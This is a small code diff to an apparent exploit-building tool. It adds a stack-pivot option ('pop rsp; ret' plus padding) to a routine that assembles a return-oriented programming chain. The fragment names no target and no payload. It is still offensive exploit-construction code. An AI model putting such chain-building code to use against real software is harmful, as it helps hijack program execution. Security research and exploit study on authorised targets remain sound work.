@@ -222,6 +222,15 @@ class Executable(object):
         )
 
     def setup_padding_chain(self):
+        if "pop rsp; ret" in SELECTED_GADGETS:
+            # skips the same padding block as add rsp, 0x1b8; ret
+            start = self.chain.index
+            self.chain.push_gadget("pop rsp; ret")
+            self.chain.push_value(self.chain.addr + start + 0x1C0)
+            for _ in range(54):
+                self.chain.push_value(0)
+            return
+
         # padding to align the stack
         self.chain.push_gadget("add rsp, 0x1b8; ret")
         for _ in range(55):
